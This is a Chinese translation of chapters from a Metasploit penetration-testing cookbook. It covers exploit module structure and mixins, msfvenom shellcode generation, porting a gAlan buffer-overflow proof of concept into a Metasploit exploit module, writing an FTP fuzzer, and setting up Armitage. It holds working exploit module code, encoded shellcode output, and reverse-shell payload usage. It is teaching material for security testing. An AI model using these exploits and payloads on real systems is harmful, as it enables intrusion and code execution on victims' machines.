# Metasploit 渗透测试秘籍（三）

> 原文：[`annas-archive.org/md5/5103BA072B171774B556C75B597E241F`](https://annas-archive.org/md5/5103BA072B171774B556C75B597E241F)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第八章：使用利用

在本章中，我们将涵盖：

+   利用模块结构

+   常见的利用混合

+   使用 msfvenom

+   将利用转换为 Metasploit 模块

+   移植和测试新的利用模块

+   使用 Metasploit 进行模糊测试

+   编写一个简单的 FileZilla FTP 模糊器

# 介绍

让我们从正式介绍利用开始这一章。**利用**可以是一段软件、一段数据或一系列命令，利用另一种软件中的漏洞或错误执行用户预期的指令。这些用户预期的指令可能会导致受影响软件的异常行为。利用在渗透测试中起着至关重要的作用，因为它可以为目标系统提供一个简单的入口。

到目前为止，我们已经广泛使用利用的力量进行渗透测试。这里需要注意的一点是，我们不能直接将任何独立的概念验证或利用代码直接用于 Metasploit 框架。我们必须将其转换为框架可理解的模块。这个过程与开发辅助模块类似，但有一些额外的字段。本章将涵盖您在框架内使用利用时需要了解的每一个细节。我们不会涵盖与开发利用相关的方面，因为这是一个独立的研究领域。在这里，我们将使用现有的利用概念验证，并看看如何将其添加到框架中。我们还将学习一些重要的混合技术，可以简化将利用转换为 Metasploit 模块的过程。最后，我们将涵盖一些关于模糊测试模块的配方。让我们继续前进吧。

# 利用模块结构

理解利用模块结构非常重要，因为它将帮助我们正确分析不同的利用模块。由于 Metasploit 框架是一个开源项目，其发展取决于社区的贡献。来自全球各地的开发人员将各种漏洞的概念转化为 Metasploit 模块，以便每个人都可以使用。因此，您也可以通过将新发现的漏洞转换为模块来为社区做出贡献。此外，可能会出现需要特定漏洞但框架中没有的情况。了解利用模块结构将帮助您轻松地将漏洞转换为模块。

## 准备工作

让我们从理解框架内利用的模块化结构开始这个配方。它与辅助结构类似，但有一些特定的字段。您可以在`/pentest/exploits/framework3`目录中找到利用模块。让我们分析一下 MSF 中的利用结构。

## 如何做…

正如我们之前所说，利用模块的格式与辅助模块类似，但有一些特定的添加：

```
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::Tcp
include Msf::Exploit::EXE

```

该模块以将 MSF 核心库包含到脚本中开始，并声明一个类，该类扩展了与利用相关的属性。在这个例子中，`Metasploit3`类扩展了`Remote Exploit`库。此外，脚本还包括其他库，如 TCP：

```
def initialize(info = {})
super(update_info(info,
'Name' => '',
'Description')

```

然后，我们有`initialize`函数，用于初始化有关模块的不同值和内容定义。此函数的一些主要定义包括`Name，Description，Author，Version`等：

```
register_options(
[
Opt::RPORT(7777),
], self.class)
end

```

然后，我们有脚本的注册选项部分，负责提供脚本的基本和默认值。这些值可以根据用户的需求进行更改。到目前为止，它与辅助模块非常相似。不同之处在于定义`exploit()`函数：

```
def exploit
connect()
sock.put(payload.encoded)
handler()
disconnect()
end

```

这是模块的主要利用主体，包含 shell 代码或利用模式。这个函数的内容因利用而异。可能存在于远程利用中的一些关键特性列在函数体中。`connect()`用于与目标打开远程连接。它是在`Remote::TCP`库中定义的函数。有效载荷也是利用主体的一个重要部分，它有助于建立反向连接。我们还可以根据需要在利用主体中定义处理程序。

可选地，您还可以声明一个漏洞测试函数`check()`，用于验证目标是否存在漏洞。它验证除有效载荷之外的所有选项。

这是对 Metasploit 的利用模块的基本介绍。在后面的配方中，我们将讨论与框架中的利用相关的一些核心概念。

## 它是如何工作的...

我们刚刚分析的利用模块结构是 Metasploit 使事情变得可理解的方式。考虑函数`def initialize()`。这部分帮助模块捡起常见的利用定义。同样，`register_options()`被 Metasploit 用来捡起不同的参数或为利用模块分配默认参数值。这就是模块化架构变得方便的地方。在本章的后面，我们将看到如何将现有的利用代码转换为 Metasploit 模块。

# 常见的利用混合物

混合物是 Ruby 语言中包含功能到模块的一个全面机制。混合物提供了一种在单一继承语言中实现多重继承的方式，比如 Ruby。在利用模块中使用混合物可以帮助调用利用所需的不同函数。在这个配方中，我们将学习一些重要的 Metasploit 利用混合物。

## 如何做...

让我们快速看一下一些常见的利用混合物。然后，我们将看到它在现有的利用模块中的实现。

+   `Exploit::Remote::TCP:` 这个混合物为模块提供了 TCP 功能。它可以用来建立 TCP 连接。`connect()`和`disconnect()`函数分别负责建立和终止连接。它需要不同的参数，比如`RHOST, RPORT, SSL`。

+   `Exploit::Remote::UDP:` 这个混合物用于模块中的 UDP 功能。UDP 通常被视为比 TCP 更快的连接模式，因此在处理模块时也可以是一个方便的选项。这个混合物进一步包括`Rex::Socket::UDP`，它消除了担心与目标建立套接字连接的开销。

+   `Exploit::Remote::DCERPC:` 这个混合物提供了与远程机器上的 DCE/RPC 服务进行交互的实用方法。这个混合物的方法通常在利用的上下文中非常有用。这个混合物扩展了 TCP 混合物。`dcerpc_call(), dcerpc_bind()`等等是 DCE/RPC 混合物的一些有用函数。

+   `Exploit::Remote::SMB:` 这个混合物定义了可以帮助与远程目标上的 SMB 服务进行通信的函数。`smb_login(), smb_create()`等等是这个混合物中存在的一些有用的函数。

+   `Exploit::BruteTargets:` 这是一个有趣的混合物，用于对目标进行暴力破解。它使用`exploit_target(target)`函数来接收远程目标 IP 并执行暴力破解。这个混合物可以很容易地在不同的暴力破解利用中扩展。

+   `Exploit::Remote::Ftp:` 这个混合物可以用来利用远程目标上的 FTP 服务。混合物包括`Remote::TCP`以便与远程目标建立连接。它使用`connect()`函数，该函数接收`RHOST`和`RPORT`的值，以便与远程系统上的 FTP 服务器连接。

+   `Exploit::Remote::MSSQL:`这个混合物有助于与远程数据库查询。`Mssql_ping()`函数查询数据库的可用性，并将 ping 响应存储为哈希。`Mssql_xpcmdshell()`函数用于使用`xp_cmdshell`执行系统命令。在处理与 MS SQL 相关的利用时，这个混合物非常方便。

+   `Exploit::Capture:`这个混合物有助于嗅探网络中流动的数据包。`open_pcap()`函数用于设置设备以捕获通过它流动的数据包。这个混合物需要机器上安装了 pcap。这个混合物的两个重要函数包括`inject(pkt="", pcap=self.capture)`和`inject_reply()`。前者负责将数据包注入到网络设备中，而后者负责报告由设备返回的结果数据包，具体取决于注入的数据包。

这些是一些在框架内使用利用模块时非常方便的重要利用混合物。使用混合物可以减少重复编写相同模块的开销。这就是为什么模块化架构非常灵活的原因，因为它促进了代码重用。

## 它是如何工作的...

如前所述，混合物用于在单继承语言（如 Ruby）中提供多重继承。我们的意思是，根据需要，我们可以在任何模块中调用不同的功能。例如，如果我们想在我们的利用模块中建立 TCP 连接，就不需要为此定义一个完整的函数。我们可以简单地在我们的模块中调用混合物`Exploit::Remote::TCP`，并利用它的功能。

## 还有更多...

让我们列出一些更重要的混合物。

### 一些更多的混合物

除了之前提到的混合物之外，框架中还有许多其他关键的混合物。这些包括`fileformat, imap, java, smtp, she`等等。您可以在`lib/msf/core/exploit`中找到这些混合物。

# 使用 msfvenom

我们已经在第四章中阅读了有关`mefencode`和`msfpayload`的内容，*客户端利用和防病毒绕过*。让我们进行一个小小的回顾。`msfpayload`用于从有效负载生成二进制，而`msfencode`用于使用不同的编码技术对二进制进行编码。在这里，我们将讨论另一个 Metasploit 工具，它结合了两者。这个工具在生成可以悄悄执行的利用方面起着重要作用。

## 准备工作

要开始我们的`msfvenom`实验，启动终端窗口并传递`msfvenom -h`命令。

## 如何做...

让我们看看各种可用选项：

```
root@bt:~# msfvenom -h
Usage: /opt/framework/msf3/msfvenom [options]
Options:
-p, --payload [payload] Payload to use. Specify a '-' or stdin to use custom..
-l, --list [module_type] List a module type example: payloads, encoders, nops, all
-n, --nopsled [length] Prepend a nopsled of [length] size on to the payload
-f, --format [format] Format to output results in: raw, ruby, rb, perl, pl, bash..
-e, --encoder [encoder] The encoder to use
-a, --arch [architecture] The architecture to use
-s, --space [length] The maximum size of the resulting payload
-b, --bad-chars [list] The list of characters to avoid example: '\x00\xff'
-i, --iterations [count] The number of times to encode the payload
-c, --add-code [path] Specify an additional win32 shellcode file to include
-x, --template [path] Specify a custom executable file to use as a template
-k, --keep Preserve the template behavior and inject the payload as..
-h, --help Show this message 

```

有一些有趣的参数需要注意。`-n`参数创建有效负载大小的 NOP 滑坡。另一个有趣的参数是`-b`，它使我们有能力避免利用中的常见字符，如`\x00`。这在规避防病毒程序方面非常有帮助。其余的参数与我们可以在`msfpayload`和`msfencode`中找到的参数类似。

### 注意

NOP 滑坡，NOP 滑梯或 NOP 坡是一系列 NOP（无操作）指令，旨在“滑动”CPU 的指令执行流到最终期望的目的地。

## 它是如何工作的...

要使用`msfvenom`，我们将不得不传递有效负载以及编码样式。让我们在终端窗口上执行这个任务：

```
root@bt:~# msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3
[*] x86/shikata_ga_nai succeeded with size 325 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 352 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 379 (iteration=3)
buf =
"\xdb\xdb\xbe\x0a\x3a\xfc\x6d\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x52\x31\x72\x18\x83\xea\xfc\x03\x72\x1e\xd8\x09\xb6" +
"\xce\xc5\x86\x6d\x1a\xa8\xd8\x88\xa8\xbc\x51\x64\xe5\xf2" +
"\xd1\xb7\x80\xed\x66\x72\x6e\x0d\x1c\x68\x6a\xae\xcd\x0e" +
"\x33\x90\x1d\x73\x82\xd8\xd7\xe0\x87\x76\xbd\x25\xf4\x23" +
"\x4d\x38\xc2\xc3\xe9\xa1\x7e\x31\xc5\xe4\x84\x2a\x3b\x37" +
"\xb3\xd6\x13\xc4\x09\x89\xd0\x95\x21\x10\x6b\x83\x94\x3d" + 
```

注意已传递的不同参数。`-b`参数的存在将避免在 shell 代码中使用`\x00`（空字节）。我们可以在我们的利用程序中使用这个 shell 代码。

`msfvenom`可以是一个非常方便的工具，可以快速生成使用框架中可用的不同有效负载的 shell 代码。这些 shell 代码可以在利用代码中实现，以便在利用漏洞后与攻击者提供反向连接。

# 将利用转换为 Metasploit 模块

到目前为止，我们已经使用利用模块来 compromise 我们的目标。在这个配方中，我们将把我们的模块使用经验提升到一个新的水平。我们将尝试使用可用的概念验证来开发一个完整的利用模块。将利用转换为模块的知识对于将任何新的利用转换为框架模块并执行渗透测试而不必等待 Metasploit 团队的更新是必不可少的。此外，并不是每个利用都会以框架模块的形式可用。因此，让我们继续进行配方，并看看我们如何使用可用的概念验证构建我们自己的利用模块。

## 准备工作

首先，让我们选择任何可以转换为模块的利用。让我们考虑可以从[`www.exploit-db.com/exploits/10339`](http://www.exploit-db.com/exploits/10339)下载的 gAlan 零日利用。

**gAlan**是一个音频处理工具（在线和离线），适用于 X Windows 和 Win32。它允许您以模块化的方式通过链接表示原始音频处理组件的图标来构建合成器、效果链、混音器、序列器、鼓机等。

对于 gAlan 的利用只有在受害者使用该应用程序并且攻击者事先知道这一点时才会起作用。因此，攻击者必须知道受害者机器上安装了哪些应用程序。

## 如何做...

在开始利用转换之前，有必要了解一些关于堆栈溢出攻击的知识。

在软件中，堆栈溢出发生在调用堆栈上使用了太多内存时。调用堆栈是包含有限内存量的软件的运行时堆栈，通常在程序开始时确定。调用堆栈的大小取决于许多因素，包括编程语言、机器架构、多线程和可用内存量。当程序尝试使用的空间超过调用堆栈上可用的空间时，堆栈被认为溢出，通常导致程序崩溃。基本上，`ESP`、`EIP`和`EAX`是在利用期间经常受到攻击的寄存器。

+   `ESP:` 指向堆栈顶部

+   `EIP:` 指向下一条指令的位置

+   `EAX:` 要执行的指令

由于在堆栈中所有寄存器都是线性存储的，我们需要知道`EIP`寄存器的确切缓冲区大小，以便溢出它将给我们`EAX`和随后执行有效载荷。

一旦我们有了利用的概念验证，下一步将是尽可能收集有关利用的信息。让我们仔细看看概念验证。前几行包括存储在`$shellcode`变量中的 shellcode。这可以使用框架中可用的任何有效载荷使用`msfpayload`或`msfvenom`生成。

```
$magic = "Mjik";
$addr = 0x7E429353; # JMP ESP @ user32,dll
$filename = "bof.galan";
$retaddr = pack('l', $addr);
$payload = $magic . $retaddr x 258 . "\x90" x 256 . $shellcode;

```

主要的利用代码以`$magic`开头，其中包含一个四字节的字符串。然后，我们有`$addr`变量，其中包含`ESP`堆栈指针的位置。然后我们有`$filename`变量，其中包含要在后期创建的文件名。`$retaddr`包含堆栈指针将指向并导致溢出后利用代码执行的返回地址的位置。最后，我们有有效载荷的执行，负责利用和 shellcode 执行。

我们从利用中知道我们的 shellcode 最多可以达到 700 字节。我们有效载荷的总长度为 1214 字节。这些信息将有助于构建我们的模块。

我们可以使用重复的返回地址，也可以找到`EIP`被覆盖时的大小。Metasploit 有一个名为`pattern_create.rb`的优秀工具，可以帮助找到`EIP`被覆盖的确切位置。这个工具生成一串唯一模式的字符串，可以传递给利用代码，并通过调试器，我们可以找到`EIP`中存储的字符串模式。让我们创建一个 5000 个字符的字符串：

```
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb
Usage: pattern_create.rb length [set a] [set b] [set c]
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb 5000 
```

现在，编辑利用脚本，将`$payload`替换为另一个测试变量`$junk`，并将 5000 个字符的字符串复制到这个变量中。现在，使用这个脚本测试应用程序，并检查`EIP`中存储的模式。我假设您已经了解了反向和调试应用程序的基础知识。假设存储在`EIP`中的字符串模式是"234abc"。现在我们将使用另一个 Metasploit 工具称为`pattern_offset.rb`来计算我们传递的字符串中存在这个模式的位置：

```
root@bt:/pentest/exploits/framework3/tools# ./pattern_offset.rb 0x234abc 5000
1032 
```

因此，要传递的总字节数，以便获得`EIP`的确切位置，为 1032。

现在我们已经收集了关于利用的足够信息，我们准备将其转换为 Metasploit 模块。

## 它是如何工作的...

让我们开始构建我们的模块。脚本的第一行将是导入库并创建父类。然后，我们将定义包含有关利用的信息并注册选项的`initialize()`函数：

```
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
include Msf::Exploit::FILEFORMAT
def initialize(info = {})
super(update_info(info,
'Name' => 'gAlan 0.2.1 Buffer Overflow Exploit',
'Description' => %q{
This module exploits a stack overflow in gAlan 0.2.1
By creating a specially crafted galan file, an attacker may be able
to execute arbitrary code.
},
'License' => MSF_LICENSE,
'Author' => [ 'original by Jeremy Brown' ],
'Version' => '$Revision: 7724 $',
'References' =>
[
[ 'URL', 'http://www.exploit-db.com/exploits/10339' ],
],
'DefaultOptions' =>
{
'EXITFUNC' => 'process',
},
'Payload' =>
{
'Space' => 1000,
'BadChars' => "\x00\x0a\x0d\x20\x0c\x0b\x09",
'StackAdjustment' => -3500,
Metasploit moduleworking},
'Platform' => 'win',
'Targets' =>
[
[ 'Windows XP Universal', { 'Ret' => 0x100175D0} ], # 0x100175D0 call esi @ glib-1_3
],
'Privileged' => false,
'DefaultTarget' => 0))
register_options(
[
OptString.new('FILENAME', [ false, 'The file name.', 'evil.galan']),
], self.class)
end

```

到目前为止，一切都很简单明了。转折点在于定义`exploit()`函数。让我们看看如何做到这一点。

我们将从原始利用脚本的前四个字节开始，即`$magic = "Mjik"`;

它将在我们的模块中被替换为`sploit = "Mjik"`。

然后，我们继续构建我们的缓冲区。由于我们已经找到了`EIP`被覆盖的位置，我们可以将重复的返回地址值替换为：

```
sploit << rand_text_alpha_upper(1028);
sploit << [target.ret].pack('V');

```

然后，我们将添加我们的 nop 滑块。因此，利用脚本的这部分将更改为模块中的以下行：

```
sploit << "\x90" * 45

```

最后，我们构建完整的 shellcode：

```
sploit << payload.encoded

```

最后，我们可以将这些脚本行组合在`exploit()`函数下。

```
def exploit
sploit = "Mjik"
sploit << rand_text_alpha_upper(1028)
sploit << [target.ret].pack('V')
sploit << "\x90" * 45
sploit << payload.encoded
galan = sploit
print_status("Creating '#{datastore['FILENAME']}' file ...")
file_create(galan)
end 
```

这是一个简单明了的演示，说明了我们如何将现有的利用转换为 Metasploit 模块。这个过程的难度水平可能因利用而异。了解更多的最佳方法是查看 Metasploit 库中可用的利用模块。在下一个示例中，我们将学习如何将这个利用模块移植到框架中，以便我们可以将其用于渗透测试。

# 移植和测试新的利用模块

在上一个示例中，我们学习了如何使用现有的概念来开发 Metasploit 的完整利用模块。在这个示例中，我们将把模块保存在一个合适的位置，然后测试它，看看是否一切顺利。

## 准备工作

非常重要的是要注意我们将存储利用模块的文件夹。这可以帮助您跟踪不同的模块，并且还可以帮助框架了解基本模块的使用。现在您有了完整的模块脚本，让我们找一个合适的位置来保存它。

## 如何做...

由于这是一个利用模块，针对影响特定文件格式的 Windows 操作系统，我们将不得不相应地选择模块位置。查看`modules/exploits/windows`目录，您可以找到一个特定的文件夹用于`fileformat`利用模块。这是我们可以保存模块的位置。让我们将其保存为`galan_fileformat_bof.rb`。

## 它是如何工作的...

下一个和最后的任务将是检查我们的模块是否正常运行。到目前为止，我们已经与模块一起工作了很多，所以这一步将很容易。我们将遵循迄今为止我们所使用的相同过程：

```
msf > use exploit/windows/fileformat/galan_fileformat_bof
msf exploit(galan_fileformat_bof) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(galan_fileformat_bof) > set LHOST 192.168.56.101
msf exploit(galan_fileformat_bof) > exploit 
```

一旦传递了利用命令，模块将执行并创建一个文件，可以用来在目标机器上引起溢出。

这完成了我们的模块创建和执行过程。您可能已经看到，该过程很简单。真正的努力在于将利用脚本正确转换为框架模块。您可以根据需要调试或修改任何现有模块。您还可以将任何新创建的模块提交给 Metasploit 社区，以帮助其他人从中受益。

# 使用 Metasploit 进行模糊测试

模糊测试或模糊是一种软件测试技术，它包括使用随机数据注入来查找实现错误。模糊脚本生成格式不正确的数据，并将其传递给特定的目标实体，以验证其溢出容量。Metasploit 提供了几个模糊模块，这些模块在利用开发中可能会有所帮助。让我们更多地了解一下模糊测试的基础知识，以及如何使用 Metasploit 模块作为潜在的模糊器。

## 准备就绪

在我们跳转到 Metasploit 模糊器模块之前，让我们简要概述一下模糊测试及其类型。

模糊测试被视为一种黑盒测试技术，用于测试软件的最大溢出容量。模糊测试被积极用于查找应用程序中的错误。

模糊器可用于测试软件、协议和文件格式。模糊器自动化了数据生成和注入的过程。我们可以控制要注入的数据或数据包的大小。

模糊器将尝试对攻击进行组合：

+   数字（有符号/无符号整数，浮点数等）

+   字符（URL 和命令行输入）

+   元数据：用户输入文本（`id3`标签）

+   纯二进制序列

根据我们所针对的应用程序或协议的类型，我们可以设置我们的模糊器以生成数据/数据包来测试其溢出。Metasploit 包含几个模糊器模块，可用于对应用程序和协议进行黑盒测试。这些模块可以位于`modules/auxiliary/fuzzers`。让我们分析这些模块的实现。

## 如何做…

让我们尝试使用基于协议的模糊器模块。Metasploit 有一个名为`client_ftp.rb`的 FTP 模块，它充当 FTP 服务器并向 FTP 客户端发送响应：

```
msf > use auxiliary/fuzzers/ftp/client_ftp
msf auxiliary(client_ftp) > show options
Module options:
Name Current Setting Required Description
---- --------------- -------- -----------
CYCLIC true yes Use Cyclic pattern instead..
ENDSIZE 200000 yes Max Fuzzing string size.
ERROR false yes Reply with error codes only
EXTRALINE true yes Add extra CRLF's in..
FUZZCMDS LIST.. yes Comma separated list..
RESET true yes Reset fuzzing values after..
SRVHOST 0.0.0.0 yes The local host to listen on.
SRVPORT 21 yes The local port to listen on.
SSL false no Negotiate SSL for incoming..
SSLVersion SSL3 no Specify the version of SSL..
STARTSIZE 1000 yes Fuzzing string startsize.
STEPSIZE 1000 yes Increment fuzzing string.. 
```

您可以看到我们有许多有趣的参数可供使用。让我们找出每个参数所具有的功能。

+   `CYCLIC`选项用于设置循环模式作为模糊数据。这是为了确定偏移量，因为字符串的每四个字节都是唯一的。如果设置为 false，则模糊器将使用一串 A 作为模糊数据。

+   `ENDSIZE`选项定义了发送回 FTP 客户端的模糊数据的最大长度。默认情况下，它设置为 20000 字节。

+   如果将`ERROR`选项设置为 true，则将使用错误代码回复 FTP 客户端。

+   `EXTRALINE`选项是用于目录列表的模糊测试。如果向客户端发送一个非常大的目录名称请求，一些 FTP 客户端可能会崩溃。

+   `FUZZCMDS`选项允许我们定义哪个响应需要进行模糊处理。可能的请求包括`LIST、NLST、LS、RETR`。我们还可以设置`*`以模糊处理所有命令。

+   `SRVHOST`选项是模糊器将与 FTP 服务器绑定的 IP 地址。对于本地机器，我们可以使用`0.0.0.0`。

+   `SRVPORT`选项是 FTP 服务器端口，默认为 21。

+   `STARTSIZE`选项用于定义模糊数据的初始数据长度。

+   `STEPSIZE`选项用于定义每次溢出失败时的增量。

在使用模糊器时应谨慎。如果未传递正确的参数值，则模糊测试可能会失败。您可以随时参考模块源代码，以深入了解模糊器。让我们运行我们的 FTP 客户端模糊器，看看返回的输出是什么：

```
msf auxiliary(client_ftp) > run
[*] Server started.
[*] Client connected : 192.168.56.102
[*] - Set up active data port 20
[*] Sending response for 'WELCOME' command, arg
[*] Sending response for 'USER' command, arg test
[*] Sending response for 'PASS' command, arg test
[*] - Set up active data port 16011
[*] Sending response for 'PORT' command, arg 192,168,0,188,62,139
[*] Handling NLST command
[*] - Establishing active data connection
[*] - Data connection set up
[*] * Fuzzing response for LIST, payload length 1000
[*] (i) Setting next payload size to 2000
[*] - Sending directory list via data connection 
```

输出有几个需要注意的地方。首先，FTP 服务器在攻击机器上启动。然后，它会与 FTP 客户端连接。然后，它开始向客户端机器发送不同的响应命令。模糊处理过程从`NLST`命令开始。然后，它继续到 LIST 等等。

这是 fuzzer 模块如何工作的简单演示。在下一个示例中，我们将深入研究通过构建我们自己的模糊模块来进行协议模糊。

## 它是如何工作的...

Fuzzers 根据我们想要模糊的应用程序创建不同的测试用例。在我们的例子中，FTP 服务器可以通过发送随机数据包然后分析其响应来进行模糊处理。数据包可以模糊网络上的以下属性：

+   **数据包头：**模糊器可以在标头中插入任意长度和值的随机数据包并分析其响应。

+   **数据包校验和：**在特定条件下，模糊器也可以操纵校验和值。

+   **数据包大小：**可以向网络应用程序发送任意长度的数据包以确定崩溃。

一旦崩溃或溢出被报告，fuzzer 可以返回其测试用例以提供溢出数据。

# 编写一个简单的 FileZilla FTP fuzzer

我们在上一个示例中分析了 fuzzer 模块的工作原理。让我们通过构建我们自己的小型 FTP fuzzer 来进一步深入了解 FileZilla FTP 服务器。

## 如何做...

构建 fuzzer 的基本模板将类似于我们讨论过的用于开发辅助模块的模板。因此，我们的基本模板应如下所示：

```
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
include Msf::Auxiliary::Scanner
def initialize
super(
'Name' => 'FileZilla Fuzzer',
'Version' => '$Revision: 1 $',
'Description' => 'Filezilla FTP fuzzer',
'Author' => 'Abhinav_singh',
'License' => MSF_LICENSE
)
register_options( [
Opt::RPORT(14147),
OptInt.new('STEPSIZE', [ false, "Increase string size each iteration with this number of chars",10]),
OptInt.new('DELAY', [ false, "Delay between connections",0.5]),
OptInt.new('STARTSIZE', [ false, "Fuzzing string startsize",10]),
OptInt.new('ENDSIZE', [ false, "Fuzzing string endsize",20000])
], self.class)
end

```

因此，我们已经导入了 MSF 库，创建了一个类，并定义了我们的选项。下一步将是定义 fuzzer 的主体。

```
def run_host(ip)
udp_sock = Rex::Socket::Udp.create(
'Context' =>
{
'Msf' => framework,
'MsfExploit' => self,
}
)
startsize = datastore['STARTSIZE'] # fuzz data size to begin with
count = datastore['STEPSIZE'] # Set count increment
simple FileZilla FTP fuzzerwritingwhile count < 10000 # While the count is under 10000 run
evil = "A" * count # Set a number of "A"s equal to count
pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00" # Define the payload
udp_sock.sendto(pkt, ip, datastore['RPORT']) # Send the packet
print_status("Sending: #{evil}")
resp = udp_sock.get(1) # Capture the response
count += 100 # Increase count by 10, and loop
end
end
end 
```

让我们分析脚本。脚本以创建 UDP 套接字开始，该套接字将需要与 FileZilla 服务器建立连接。然后，我们声明变量`startsize`和`count`，它们分别保存 fuzzer 的数据大小起始值和增量长度的值。然后，我们设置一个循环，在该循环下我们声明我们的恶意字符串和将作为数据包（pkt）发送的有效负载格式。

然后，脚本尝试使用`udp_sock_sendto`函数将数据包发送到服务器，并使用`resp=udp_sock.get()`捕获其响应。此外，每次接收到响应时，数据包的计数都会增加 100。

## 它是如何工作的...

要开始使用该模块，我们需要将其保存在`modules/auxiliary/fuzzers/ftp`下。让我们将 fuzzer 模块命名为`filezilla_fuzzer.rb：`

```
msf > use auxiliary/fuzzers/ftp/filezilla_fuzzer
msf auxiliary(filezilla_fuzzer) > show options
Module options (auxiliary/fuzzers/ftp/filezilla_fuzzer):
Name Current Setting Required Description
---- --------------- -------- -----------
DELAY 0.5 no Delay between..
ENDSIZE 20000 no Fuzzing string endsize
RHOSTS yes The target address
RPORT 14147 yes The target port
STARTSIZE 10 no Fuzzing string startsize
STEPSIZE 10 no Increase string size.. 
```

因此，我们的模块运行正常，并向我们显示可用的选项。让我们传递相应的值并查看我们传递`run`命令时会发生什么：

```
msf auxiliary(filezilla_fuzzer) > set RHOSTS 192.168.56.1
RHOSTS => 192.168.56.1
msf auxiliary(filezilla_fuzzer) > run
[*] Sending: AAAAAAAAAA
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
```

太棒了！fuzzer 开始向服务器发送字符串，并在服务器崩溃或循环结束之前继续该过程。如果循环在崩溃之前结束，那么您可以修改脚本以发送更大的字符串长度。这是使用 Metasploit 模糊软件的简单演示。通常不建议将 Metasploit 用作大型软件的模糊平台。我们有几个专门用于模糊软件和应用程序的专用框架。

## 还有更多...

让我们快速看一下一个模糊框架，如果您想增强您对模糊和利用开发的了解，可以在其上工作。

### Antiparser 模糊框架

Antiparser 是用 Python 编写的模糊框架。它有助于专门用于构建 fuzzer 的随机数据的创建。该框架可用于开发将在多个平台上运行的 fuzzer，因为该框架仅取决于 Python 解释器的可用性。

Antiparser 可以从[`sourceforge.net/projects/antiparser/`](http://sourceforge.net/projects/antiparser/)下载。


# 第九章：使用 Armitage

在本章中，我们将涵盖：

+   开始使用 Armitage

+   扫描和信息收集

+   查找漏洞和攻击目标

+   使用选项卡切换处理多个目标

+   使用 Armitage 进行后渗透

+   使用 Armitage 进行客户端利用

# 介绍

到目前为止，我们完全专注于 Metasploit 框架，并学习如何使用该框架来进行最佳的渗透测试。现在我们将把重点转移到 Metasploit 扩展工具上，这些工具可以进一步提升渗透测试的水平。我们将从 Armitage 开始我们的旅程，这是一个基于 GUI 的工具，可以在框架上运行。它是一个智能的 Metasploit 工具，可以可视化目标，推荐利用漏洞，并暴露框架中的高级后渗透功能。

Armitage 围绕黑客过程组织了 Metasploit 的功能。它具有用于发现、访问、后渗透和操纵的功能。Armitage 的动态工作区可以让您快速定义和切换目标标准。使用此功能将数千个主机分成目标集。Armitage 还可以启动扫描并从许多安全扫描仪导入数据。Armitage 可视化您当前的目标，因此您将了解您正在使用的主机以及您的会话位置。Armitage 推荐利用漏洞，并且可以选择运行主动检查以告诉您哪些利用漏洞将起作用。如果这些选项失败，请使用 Hail Mary 攻击来释放 Armitage 的智能自动利用攻击您的目标。

一旦进入，Armitage 将公开内置于 meterpreter 代理中的后渗透工具。通过单击菜单，您将提升权限、记录按键、转储密码哈希、浏览文件系统并使用命令行。

因此，通过使用 Armitage，我们可以通过工具提供的各种现成功能进一步简化我们的渗透测试过程。因此，让我们从设置 Armitage 与 Metasploit 的基础知识开始，然后我们将分析使用 Armitage 进行端口扫描、预渗透和后渗透。

# 开始使用 Armitage

让我们从 Armitage 的基本设置指南开始。我们将涵盖 Windows 和 Linux 中 BackTrack 中的 Armitage 设置。Armitage 已预先安装在最新版本的 BackTrack 中。要在 Windows 上设置 Armitage，可以从其官方网页下载 ZIP 文件：

[`www.fastandeasyhacking.com/download`](http://www.fastandeasyhacking.com/download)

## 如何做...

让我们从在 BackTrack 中设置 Armitage 开始。

1.  Armitage 将预先安装在 BackTrack 5 R2 中。可以通过单击桌面上的**应用程序**，然后导航到**Backtrack** | **Exploitation tools** | **Network Exploitation tools** | **Metasploit framework** | **Armitage**来启动它。

您将看到一个 GUI，询问您设置连接。它的默认用户名和密码分别为`msf`和`test`。您可以将 DB 驱动程序保留为`postgressql`，最后将 DB 连接字符串保留为`msf3:"8b826ac0"@127.0.0.1:7175/msf3:`

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_01.jpg)

1.  一旦这些默认设置完成，我们可以通过单击**启动 MSF**来启动 Armitage GUI。

在 Windows 上设置 Armitage，有两个主要要求：

+   Metasploit 版本 4.2 及以上

+   JDK 1.6

1.  您可以从前面提到的 URL 下载 ZIP 文件，但也有一个简单的替代方法。您可以转到**开始** | **程序** | **Metasploit framework** | **Framework Update**。更新完成后，它将自动将 Armitage 添加到您的 Metasploit 库中。

1.  更新完成后，可以通过导航到**开始** | **程序** | **Metasploit framework** | **Armitage**来启动 Armitage。![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_02.jpg)

1.  您将看到连接 GUI，其中设置了**主机、端口、用户**和**密码**的默认值。您可以简单地单击**连接**以在本地启动 Armitage。

1.  一旦你点击**连接**，它将要求你启动 Metasploit RPC 服务器。点击**是**，然后继续到主窗口。要在远程 Metasploit 上使用 Armitage，你可以将 IP 地址从**127.0.0.1**更改为远程 IP。

## 它是如何工作的...

Armitage 通过创建 RPC 调用到 Metasploit 来工作。一旦你点击**连接**，你会注意到一个重复的 RPC 连接失败消息。错误消息是因为 Armitage 不断尝试通过抛出 RPC 调用来连接到 Metasploit 框架，并等待响应。一旦连接成功，我们将看到包含 MSF 控制台的 Armitage GUI 在底部。

